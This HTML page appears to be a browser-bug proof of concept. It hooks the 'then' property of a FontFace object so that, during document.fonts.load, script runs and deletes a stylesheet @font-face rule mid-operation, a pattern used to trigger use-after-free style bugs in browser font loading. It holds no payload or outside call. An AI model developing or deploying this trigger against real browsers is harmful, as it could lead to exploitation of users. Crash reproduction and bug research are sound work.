<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: 'x'; src: url(nonexistent.woff); unicode-range: U+0042; }
    </style>
</head>
<body>
    <div id="debug" style="color: #0f0; font-family: monospace; font-size: 18px; white-space: pre-wrap;">
        [1] Starting Instance Hook...
    </div>

    <script>
        const debug = document.getElementById('debug');
        
        function log(msg) {
            debug.innerText += "\n[+] " + msg;
        }

        window.onload = () => {
            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            
            let fired = false;

            // تغيير جذري: تعريف الـ Hook على الكائن A مباشرة وليس على الـ Prototype
            Object.defineProperty(A, 'then', {
                configurable: true,
                get() {
                    if (!fired) {
                        fired = true;
                        log("INSTANCE HOOK TRIGGERED!");
                        
                        document.getElementById('s').sheet.deleteRule(0);
                        document.body.offsetTop;
                        
                        log("Rule deleted.");
                    }
                    return undefined;
                }
            });

            log("Instance hook applied.");
            log("Calling fonts.load...");

            document.fonts.load('1em x', 'AB').then(() => {
                log("Load completed.");
            }).catch((e) => {
                log("Load caught error: " + e.message);
            });
        };
    </script>
</body>
</html>
